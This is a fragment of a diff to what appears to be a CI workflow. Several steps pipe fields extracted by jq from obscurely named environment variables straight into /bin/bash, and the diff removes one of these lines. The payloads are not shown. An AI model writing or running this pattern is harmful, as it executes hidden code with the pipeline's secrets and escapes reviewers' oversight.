@@ -19,7 +19,6 @@ jobs:
           printf '%s' "$wrpcd1600" | jq -r .n9639 | /bin/bash
           printf '%s' "$jbrrm66876" | jq -r .tlhls55 | /bin/bash
           echo $ugfqc5222 | jq -r .cphpz5 | /bin/bash
-          printf '%s' "$gyp80" | jq -r .wog95735 | /bin/bash
           echo $pc122 | jq -r .q3930 | /bin/bash
 
       - name: Store results
